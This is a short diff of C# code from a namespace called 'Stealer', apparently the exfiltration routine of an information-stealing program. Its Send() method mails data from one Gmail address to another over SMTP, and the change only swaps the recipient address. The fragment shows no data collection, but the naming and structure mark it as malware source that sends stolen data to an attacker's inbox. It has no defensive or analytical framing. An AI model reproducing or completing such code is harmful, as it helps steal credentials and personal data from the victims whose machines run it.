@@ -8,7 +8,7 @@ namespace Stealer
         public static void Send()
         {
             MailAddress from = new MailAddress("tolichek1984@gmail.com", "Имя (необязательно)");
-            MailAddress to = new MailAddress("vitalik3221337@gmail.com", "Vitalik ");
+            MailAddress to = new MailAddress("gameover160600@gmail.com", "Vitalik ");
 
             using (MailMessage mailMessage = new MailMessage(from, to))
             using (SmtpClient smtpClient = new SmtpClient())
